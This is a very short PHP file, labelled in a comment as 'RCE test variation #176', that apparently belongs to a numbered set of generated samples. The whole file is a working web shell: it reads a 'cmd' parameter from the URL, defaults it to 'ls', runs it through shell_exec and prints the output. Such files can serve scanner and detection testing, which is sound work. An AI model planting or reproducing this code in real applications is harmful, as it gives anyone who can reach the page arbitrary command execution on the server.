<?php
// RCE test variation #176
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>